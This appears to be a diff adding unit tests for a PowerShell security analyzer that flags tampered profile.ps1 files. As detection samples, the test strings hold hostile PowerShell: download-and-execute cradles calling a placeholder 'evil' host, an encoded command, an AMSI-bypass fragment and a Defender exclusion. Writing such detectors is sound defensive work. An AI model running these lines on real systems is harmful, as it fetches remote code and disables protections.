@@ -495,4 +495,189 @@ public class PowerShellSecurityAnalyzerTests
         Assert.Same(PowerShellSecurityAnalyzer.InsecurePolicies, PowerShellAudit.InsecurePolicies);
         Assert.Same(PowerShellSecurityAnalyzer.SecurePolicies, PowerShellAudit.SecurePolicies);
     }
+
+    // ------------------------------------------------------------------
+    // CheckProfiles - profile.ps1 tampering (T1546.013)
+    // ------------------------------------------------------------------
+
+    private static PowerShellProfileInfo Profile(string content, bool machineWide = false,
+        string scope = "CurrentUserCurrentHost", string path = @"C:\Users\me\Documents\PowerShell\profile.ps1")
+        => new() { Content = content, IsMachineWide = machineWide, Scope = scope, Path = path };
+
+    [Fact]
+    public void CheckProfiles_NullState_Throws()
+    {
+        Assert.Throws<ArgumentNullException>(() => CheckProfiles(null!));
+    }
+
+    [Fact]
+    public void CheckProfiles_NoProfiles_IsSinglePass()
+    {
+        var findings = CheckProfiles(new PowerShellState());
+        Assert.Single(findings);
+        Assert.Equal(Severity.Pass, findings[0].Severity);
+        Assert.Contains("No PowerShell Profile", findings[0].Title);
+    }
+
+    [Fact]
+    public void CheckProfiles_CleanPerUserProfile_IsPass()
+    {
+        var state = new PowerShellState
+        {
+            Profiles = { Profile("Set-Alias ll Get-ChildItem\n$PSStyle.OutputRendering = 'Ansi'") }
+        };
+        var findings = CheckProfiles(state);
+        Assert.Single(findings);
+        Assert.Equal(Severity.Pass, findings[0].Severity);
+        Assert.Contains("Clean", findings[0].Title);
+    }
+
+    [Fact]
+    public void CheckProfiles_PerUserDownloadCradle_IsWarning()
+    {
+        var state = new PowerShellState
+        {
+            Profiles = { Profile("IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')") }
+        };
+        var findings = CheckProfiles(state);
+        var f = Assert.Single(findings);
+        Assert.Equal(Severity.Warning, f.Severity);
+        Assert.Contains("Suspicious PowerShell Profile", f.Title);
+        Assert.Contains("DownloadString", f.Description);       // reason surfaced
+        Assert.Contains("T1546.013", f.Description);            // MITRE technique cited
+        Assert.NotNull(f.Remediation);
+    }
+
+    [Fact]
+    public void CheckProfiles_MachineWideMalicious_IsCritical()
+    {
+        var state = new PowerShellState
+        {
+            Profiles =
+            {
+                Profile("powershell -EncodedCommand ZQBjAGgAbwA=",
+                    machineWide: true, scope: "AllUsersAllHosts",
+                    path: @"C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1")
+            }
+        };
+        var findings = CheckProfiles(state);
+        var f = Assert.Single(findings);
+        Assert.Equal(Severity.Critical, f.Severity);
+        Assert.Contains("machine-wide", f.Description);
+    }
+
+    [Fact]
+    public void CheckProfiles_MachineWideClean_IsInfo()
+    {
+        var state = new PowerShellState
+        {
+            Profiles =
+            {
+                Profile("# corporate banner\nWrite-Host 'Welcome'",
+                    machineWide: true, scope: "AllUsersCurrentHost")
+            }
+        };
+        var findings = CheckProfiles(state);
+        var f = Assert.Single(findings);
+        Assert.Equal(Severity.Info, f.Severity);
+        Assert.Contains("Machine-Wide", f.Title);
+    }
+
+    [Fact]
+    public void CheckProfiles_AmsiBypass_IsFlagged()
+    {
+        var state = new PowerShellState
+        {
+            Profiles = { Profile("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')") }
+        };
+        var f = Assert.Single(CheckProfiles(state));
+        Assert.Equal(Severity.Warning, f.Severity);
+        Assert.Contains("AMSI", f.Description);
+    }
+
+    [Fact]
+    public void CheckProfiles_MultipleProfiles_GradesEachIndependently()
+    {
+        var state = new PowerShellState
+        {
+            Profiles =
+            {
+                Profile("Set-Alias g git"),                                            // clean per-user
+                Profile("iex (irm http://evil/p)", scope: "CurrentUserAllHosts"),       // malicious per-user
+                Profile("Write-Host hi", machineWide: true, scope: "AllUsersAllHosts")  // clean machine-wide
+            }
+        };
+        var findings = CheckProfiles(state);
+        // malicious per-user -> Warning; clean machine-wide -> Info; clean per-user contributes nothing
+        // (and because at least one finding was produced, no summary Pass is appended).
+        Assert.Contains(findings, f => f.Severity == Severity.Warning);
+        Assert.Contains(findings, f => f.Severity == Severity.Info);
+        Assert.DoesNotContain(findings, f => f.Severity == Severity.Pass);
+        Assert.Equal(2, findings.Count);
+    }
+
+    [Fact]
+    public void CheckProfiles_UnreadableMachineWide_NullContentStillInfo()
+    {
+        // Collector records a machine-wide profile it could not read (Content == null):
+        // presence alone should still surface as Info, not silently drop.
+        var state = new PowerShellState
+        {
+            Profiles = { Profile(null!, machineWide: true, scope: "AllUsersAllHosts") }
+        };
+        var f = Assert.Single(CheckProfiles(state));
+        Assert.Equal(Severity.Info, f.Severity);
+    }
+
+    [Theory]
+    [InlineData("Invoke-Expression $x", "Invoke-Expression")]
+    [InlineData("[Convert]::FromBase64String($b)", "base64")]
+    [InlineData("Add-MpPreference -ExclusionPath C:\\", "Defender")]
+    [InlineData("Start-Process pwsh -WindowStyle Hidden", "hidden")]
+    public void ScanProfileContent_KnownBadTokens_AreDetected(string content, string expectReasonSubstring)
+    {
+        var reasons = ScanProfileContent(content);
+        Assert.NotEmpty(reasons);
+        Assert.Contains(reasons, r => r.Contains(expectReasonSubstring, StringComparison.OrdinalIgnoreCase));
+    }
+
+    [Fact]
+    public void ScanProfileContent_NullOrBlank_IsEmpty()
+    {
+        Assert.Empty(ScanProfileContent(null));
+        Assert.Empty(ScanProfileContent("   "));
+    }
+
+    [Fact]
+    public void ScanProfileContent_CleanContent_IsEmpty()
+    {
+        Assert.Empty(ScanProfileContent("Set-Alias ll Get-ChildItem; $ErrorActionPreference='Stop'"));
+    }
+
+    [Fact]
+    public void ScanProfileContent_IsCaseInsensitive()
+    {
+        Assert.NotEmpty(ScanProfileContent("IEX ($code)"));
+        Assert.NotEmpty(ScanProfileContent("iex ($code)"));
+    }
+
+    [Fact]
+    public void ScanProfileContent_DeDuplicatesReasons()
+    {
+        // Two tokens map to the same "AMSI-bypass tampering" family but distinct reasons;
+        // a single reason must never be reported twice for one profile.
+        var reasons = ScanProfileContent("iex; Invoke-Expression; iex");
+        Assert.Equal(reasons.Count, reasons.Distinct().Count());
+    }
+
+    [Fact]
+    public void Analyze_IncludesProfileFinding()
+    {
+        // The aggregate entry point must now surface profile results (a Pass here,
+        // since the default state has no profiles).
+        var findings = Analyze(new PowerShellState());
+        Assert.Contains(findings, f =>
+            f.Category == Category &&
+            (f.Title.Contains("Profile") || f.Title.Contains("profile")));
+    }
 }
